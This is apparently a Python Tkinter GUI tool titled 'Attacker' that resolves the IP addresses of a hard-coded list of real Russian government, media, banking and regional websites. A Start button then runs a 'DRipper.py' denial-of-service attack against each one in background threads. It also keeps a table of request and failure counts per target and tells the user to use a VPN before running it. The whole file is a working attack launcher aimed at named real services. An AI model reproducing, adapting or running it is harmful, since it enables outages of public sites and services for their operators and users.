#!/usr/bin/python3
import os
import tkinter as tk
import subprocess, shlex
import threading
import dns.resolver
import random
import pathlib

os.environ["PYTHONUNBUFFERED"] = "1"

d={
	"https://lenta.ru/": {
		"number_of_requests": 571,
		"number_of_errored_responses": 0
	},
	"https://auth.ria.ru/": {
		"number_of_requests": 70,
		"number_of_errored_responses": 0
	},
	"https://ria.ru/": {
		"number_of_requests": 70,
		"number_of_errored_responses": 0
	},
	"https://ria.ru/lenta/": {
		"number_of_requests": 70,
		"number_of_errored_responses": 0
	},
	"https://www.rbc.ru/": {
		"number_of_requests": 65,
		"number_of_errored_responses": 0
	},
	"https://www.rt.com/": {
		"number_of_requests": 67,
		"number_of_errored_responses": 0
	},
	"http://kremlin.ru/": {
		"number_of_requests": 73,
		"number_of_errored_responses": 73,
		"error_message": "Failed to fetch"
	},
	"http://en.kremlin.ru/": {
		"number_of_requests": 68,
		"number_of_errored_responses": 68,
		"error_message": "Failed to fetch"
	},
	"https://smotrim.ru/": {
		"number_of_requests": 69,
		"number_of_errored_responses": 0
	},
	"https://tass.ru/": {
		"number_of_requests": 65,
		"number_of_errored_responses": 0
	},
	"https://tvzvezda.ru/": {
		"number_of_requests": 63,
		"number_of_errored_responses": 0
	},
	"https://rbc.ru/": {
		"number_of_requests": 61,
		"number_of_errored_responses": 0
	},
	"https://minzdrav.gov.ru/": {
		"number_of_requests": 60,
		"number_of_errored_responses": 0
	},
	"http://government.ru/": {
		"number_of_requests": 66,
		"number_of_errored_responses": 66,
		"error_message": "Failed to fetch"
	},
	"https://www.mchs.gov.ru/": {
		"number_of_requests": 59,
		"number_of_errored_responses": 2,
		"error_message": "Failed to fetch"
	},
	"https://rkn.gov.ru/": {
		"number_of_requests": 65,
		"number_of_errored_responses": 0
	},
	"http://www.council.gov.ru/": {
		"number_of_requests": 68,
		"number_of_errored_responses": 68,
		"error_message": "Failed to fetch"
	},
	"https://www.sberbank.ru/en/individualclients": {
		"number_of_requests": 66,
		"number_of_errored_responses": 0
	},
	"https://kassa.yandex.ru/main-new": {
		"number_of_requests": 61,
		"number_of_errored_responses": 3,
		"error_message": "Not Found"
	},
	"http://www.gosuslugi.ru/ru/": {
		"number_of_requests": 67,
		"number_of_errored_responses": 67,
		"error_message": "Failed to fetch"
	},
	"https://www.donland.ru/": {
		"number_of_requests": 63,
		"number_of_errored_responses": 2,
		"error_message": "Failed to fetch"
	}
}



OptionList = [
"tk-union.tv",
"republic-tv.ru",
"dnronline.su",
"dnr-news.com",
"gorod-donetsk.com",
"vsednr.ru",
"mininfodnr.ru",
"tk-union.tv",
"inosmi.ru",
"www.the-american-interest.com",
"miaistok.su",
"lug-info.com",
"www.rt.com",
"sputniknews.com",
"tass.ru",
"ruptly.tv",
"tvzvezda.ru",
"www.cbr.ru",
"www.kremlin.ru",
"www.vesti.ru",
"www.smotrim.ru",
"www.vgtrk.ru",
"www.politnavigator.net",
"ukraina.ru",

] 

f = [i.replace('https://', '').replace('http://', '').replace('/', '') for i in list(d.keys())]
OptionList.extend(f)
OptionList=list(set(OptionList))


def get_ip(host):
	try:
		resolver = dns.resolver.Resolver()
		ips = list(resolver.query(host, 'A'))
		ip = random.choice(ips)
	except:
		ip = '255.255.255.255'
		return ip
	return ip.to_text()


app = tk.Tk()
app.title("Attacker")

app.geometry('300x300')

# host= tk.StringVar(app)
# host.set(OptionList[0])

# opt = tk.OptionMenu(app, host, *OptionList)
# opt.config(width=90, font=('Helvetica', 12))
# opt.pack()

message = tk.StringVar(app)
label = tk.Label(app, textvariable=message)
label.pack()

message.set("Better use vpn before running this app")

text = tk.Text(app, height=5, width=152)

proc = None


def a(ip):
	cmd = f'python3 DRipper.py -s {ip} -t 135 -p 443'
	with subprocess.Popen(shlex.split(cmd), stdout=subprocess.PIPE) as process:
		while True:
			output = process.communicate()[0].decode() # "utf-8")
			print(output)
			text.insert('1.0', output)

	# t = threading.Thread(target=subprocess.Popen, args=(shlex.split(cmd),), daemon=True)
	


def start():
	for hostText in OptionList:
		ip = get_ip(hostText)
		if ip != '255.255.255.255':
			# message.set(f"Attacking {hostText} ({ip})")
			current = pathlib.Path(__file__).parent.resolve()
			os.chdir(current)
			cmd = f'python3 DRipper.py -s {ip} -t 135 -p 443'
			# threading.Thread(target=a, args=(ip, ), daemon=True).start()
			threading.Thread(target=subprocess.Popen, args=(shlex.split(cmd),), daemon=True).start()


def stop():
	exit(0)


btn = tk.Button(app, text='Start', bd ='5', command=start)
btn.pack(side = 'top')

btn = tk.Button(app, text='Stop', bd ='5', command=stop)
btn.pack(side = 'top')

text.pack()


app.mainloop()
